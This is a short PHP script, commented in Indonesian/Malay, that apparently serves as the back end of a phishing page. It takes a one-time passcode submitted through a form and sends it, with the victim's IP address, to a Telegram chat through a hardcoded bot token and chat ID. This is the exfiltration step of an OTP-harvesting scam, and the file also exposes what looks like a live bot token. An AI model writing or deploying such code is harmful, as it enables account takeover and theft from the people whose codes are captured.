<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

// =====================
// ISI DATA BOT KAMU
// =====================
$botToken = "7690173453:AAFizIJfq7OWi5tthhxxqXKWcS0Xb5bP_iE";
$chatId   = "6832746767";

if(isset($_POST['otp'])){

    $otp = $_POST['otp'];

    $message = "🔐 OTP MASUK\n";
    $message .= "Kod: ".$otp."\n";
    $message .= "IP: ".$_SERVER['REMOTE_ADDR'];

    $url = "https://api.telegram.org/bot".$botToken."/sendMessage";

    $postData = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    if($response === false){
        echo "cURL Error: " . curl_error($ch);
    } else {
        echo $response;
    }

    curl_close($ch);
    echo "BERHASIL";
}

?>